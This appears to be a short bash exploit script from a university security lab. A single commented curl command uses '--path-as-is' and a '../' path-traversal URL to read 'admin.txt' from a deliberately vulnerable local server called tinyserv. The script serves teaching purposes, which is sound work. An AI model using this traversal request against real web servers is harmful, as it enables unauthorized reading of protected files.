#!/bin/bash

gitroot=$(git rev-parse --show-toplevel)

source $gitroot/lab3_port
source $gitroot/lab3_group_secret

# This shell script holds just one `curl` command
# that makes an HTTP GET request (https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods).

# Explanation of the arguments to curl, these ones are common across all curl interactions with tinyserv.

# -G means make a GET request
# -o means log to a file
# --ignore-content-length means ignore what the server says the file size is, and just keep reading data until the server stops sending
# --silent means don't show a progress bar while this all happens
# --verbose means show the headers from the request and the response (contradictory with silent, i know)
# --cookie "LAB_GROUP_SECRET_KEY=${LAB_GROUP_SECRET_KEY}" is used to authenticate your request and prevent other groups from exploiting your tinyserv instance

# These options are unique to this sploit
# --path-as-is tells curl to request _exactly_ the path specified, and not to pre-process it at all.
# -- http://127.0.0.1:${GROUP_PORT_NO}/../././//admin.txt the "-- " here means 'no more args follow', and the rest is the URL/file we want.


# Delete the previous sploit outputs
echo "" > sploit_output.txt

# You need to have run tinyserv as ./tinyserv ./files for this to work
curl -G -o sploit_output.txt --ignore-content-length --silent --verbose --cookie "LAB_GROUP_SECRET_KEY=${LAB_GROUP_SECRET_KEY}" --path-as-is -- http://127.0.0.1:${GROUP_PORT_NO}/../././//admin.txt 

# For convenience, we then print what we got back from the curl command
cat sploit_output.txt
